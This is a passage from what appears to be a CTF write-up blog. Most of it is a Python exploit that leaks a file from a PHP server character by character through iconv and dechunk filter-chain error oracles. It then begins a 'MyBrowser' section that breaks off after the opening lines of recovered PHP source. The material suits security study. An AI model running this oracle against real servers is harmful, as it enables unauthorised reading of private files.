class="line"><span class="string"></span></span><br><span class="line"><span class="string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span></span><br><span class="line"><span class="string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually </span></span><br><span class="line"><span class="string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span></span><br><span class="line"><span class="string">string to figure out which number it is.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rot1 = <span class="string">&#x27;convert.iconv.437.CP930&#x27;</span></span><br><span class="line">be = <span class="string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#x27;</span></span><br><span class="line">o = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_letter</span>(<span class="params">prefix</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># a-f A-F 0-9</span></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># a-e</span></span><br><span class="line">			<span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">				<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">					<span class="keyword">return</span> <span class="string">&#x27;edcba&#x27;</span>[n]</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># A-E</span></span><br><span class="line">			<span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">				<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">					<span class="keyword">return</span> <span class="string">&#x27;EDCBA&#x27;</span>[n]</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># f</span></span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;f&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># F</span></span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># n-s N-S</span></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># n-r</span></span><br><span class="line">			<span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">				<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">					<span class="keyword">return</span> <span class="string">&#x27;rqpon&#x27;</span>[n]</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># N-R</span></span><br><span class="line">			<span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">				<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">					<span class="keyword">return</span> <span class="string">&#x27;RQPON&#x27;</span>[n]</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># s</span></span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;s&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># S</span></span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;S&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># i j k</span></span><br><span class="line">		<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;k&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;j&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># I J K</span></span><br><span class="line">		<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;K&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;J&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;I&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># v w x</span></span><br><span class="line">		<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;x&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;w&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;v&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># V W X</span></span><br><span class="line">		<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;W&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;V&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># Z</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># z</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;z&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># M</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;M&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># m</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;m&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># y</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;y&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># Y</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># l</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;l&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># L</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;L&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># h</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;h&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># H</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;H&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># u</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;u&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># U</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;U&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># g</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;g&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># G</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;G&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># t</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;t&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># T</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;T&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>&#x27;</span></span><br><span class="line">	letter = find_letter(prefix)</span><br><span class="line">	<span class="comment"># it&#x27;s a number! check base64</span></span><br><span class="line">	<span class="keyword">if</span> letter == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">		prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode&#x27;</span></span><br><span class="line">		s = find_letter(prefix)</span><br><span class="line">		<span class="keyword">if</span> s == <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">			<span class="comment"># 0 - 3</span></span><br><span class="line">			prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">			ss = find_letter(prefix)</span><br><span class="line">			<span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;ijklmn&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;yz*&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> s == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">			<span class="comment"># 4 - 7</span></span><br><span class="line">			prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">			ss = find_letter(prefix)</span><br><span class="line">			<span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;ijklmn&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;yz*&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> s == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">			<span class="comment"># 8 - 9</span></span><br><span class="line">			prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">			ss = find_letter(prefix)</span><br><span class="line">			<span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;wtf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(end=letter)</span><br><span class="line">	o += letter</span><br><span class="line">	sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">We are done!! :)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">d = b64decode(o.encode() + <span class="string">b&#x27;=&#x27;</span> * <span class="number">4</span>)</span><br><span class="line"><span class="comment"># remove KR padding</span></span><br><span class="line">d = d.replace(<span class="string">b&#x27;\x1b$)C&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64decode(d))</span><br></pre></td></tr></table></figure>
<h2 id="MyBrowser"><a href="#MyBrowser" class="headerlink" title="MyBrowser"></a>MyBrowser</h2><p>我严重怀疑这一题是一个错题，首先view路由可以读取到文件的源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Turn off all error reporting</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span 